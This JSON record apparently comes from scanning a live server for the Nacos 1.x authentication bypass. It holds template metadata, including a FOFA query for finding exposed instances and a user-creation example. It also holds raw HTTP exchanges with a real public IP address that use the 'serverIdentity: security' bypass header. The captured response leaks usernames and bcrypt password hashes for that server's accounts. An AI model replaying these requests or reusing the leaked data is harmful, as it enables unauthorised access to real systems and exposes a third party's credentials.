{
    "nacos-auth-bypass": {
        "info": {
            "name": "Nacos 1.x - Authentication Bypass",
            "author": "taielab,pikpikcu,SleepingBag945",
            "severity": "critical",
            "description": "Nacos 1.x was discovered. A default Nacos instance needs to modify the application.properties configuration file or add the JVM startup variable Dnacos.core.auth.enabled=true to enable the authentication function (reference: https://nacos.io/en-us/docs/auth.html). But authentication can still be bypassed under certain circumstances and any interface can be called as in the following example that can add a new user (POST https://127.0.0.1:8848/nacos/v1/auth/users?username=test&password=test). That user can then log in to the console to access, modify, and add data.\n",
            "reference": [
                "https://github.com/alibaba/nacos/issues/4593",
                "https://nacos.io/en-us/docs/auth.html",
                "https://zhuanlan.zhihu.com/p/602021283"
            ],
            "classification": {
                "cpe": "cpe:2.3:a:alibaba:nacos:*:*:*:*:*:*:*:*"
            },
            "metadata": {
                "verified": true,
                "max-request": 2,
                "vendor": "alibaba",
                "product": "nacos",
                "fofa-query": "app=\"NACOS\""
            },
            "tags": "nacos,auth-bypass"
        },
        "targets": [
            {
                "target": "http://175.178.188.32:8848",
                "req_resp": [
                    {
                        "req": "GET /nacos/v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1\r\nHOST: 175.178.188.32\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nserverIdentity: security\r\n\r\n",
                        "resp": "HTTP/1.1 200\r\nContent-Type: application/json;charset=UTF-8\r\nTransfer-Encoding: chunked\r\nDate: Fri, 21 Mar 2025 14:30:01 GMT\r\n\r\n{\"totalCount\":18,\"pageNumber\":1,\"pagesAvailable\":2,\"pageItems\":[{\"username\":\"2rNmgPpzjLuxFfr4tqwZstVP6Od\",\"password\":\"$2a$10$ZXUqYBffuJZ7YtAOS4qO2O8Fb.Ia1HPGhbb/GcCMu4hGy7W0StjZC\"},{\"username\":\"E1R0NU\",\"password\":\"$2a$10$xAT258vEmj7wVxlkux2ac.yOYDCxRFcpyI7/txAIbpxOmjQMA8Mx2\"},{\"username\":\"febs\",\"password\":\"$2a$10$NJRJ.JUIUVX5suXNFRuOFezX5nzQLxl86OyMNnA7yxH1zr94H/gBS\"},{\"username\":\"G2LV6X\",\"password\":\"$2a$10$LqzJRMv9CKfDAn6xSezup.rFWe5KzZ37C2WA.BhWpDLzsFNp8hg5q\"},{\"username\":\"GLZ7UN\",\"password\":\"$2a$10$A62nffNcS.X8ZamZ0ANuQ.BHoZc86agIVm6BbXjOb8bbc4dnygdBi\"},{\"username\":\"haidan\",\"password\":\"$2a$10$ODckkDguURqMWTinGNbuA..ft51QBWa.fxCyQ0IAERU0tAM55D.7m\"},{\"username\":\"JXWPL7\",\"password\":\"$2a$10$fLxxqDtaitI2gMf4in.coeRAu57ab/OyIGVqrmYmzKVljxgPZoS46\"},{\"username\":\"nacos\",\"password\":\"$2a$10$7utkCV5Da9lIZF3zmdW/7.bp.73JfbtyhPbOW2R0jw37H9Gbk/SVS\"},{\"username\":\"nacos6789\",\"password\":\"$2a$10$oUW4V0WYHZBnIffdDSocsOc.rPqRKVsPfiYUfMFBSKuLZ7KpRrr7y\"}]}"
                    },
                    {
                        "req": "GET /v1/auth/users?pageNo=1&pageSize=9 HTTP/1.1\r\nHOST: 175.178.188.32\r\nUser-Agent: python-requests/2.32.3\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nserverIdentity: security\r\n\r\n",
                        "resp": "HTTP/1.1 404\r\nContent-Type: text/html;charset=utf-8\r\nContent-Language: en\r\nContent-Length: 796\r\nDate: Fri, 21 Mar 2025 14:30:01 GMT\r\n\r\n<!doctype html><html lang=\"en\"><head><title>HTTP Status 404 – Not Found</title><style type=\"text/css\">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 – Not Found</h1></body></html>"
                    }
                ]
            }
        ]
    }
}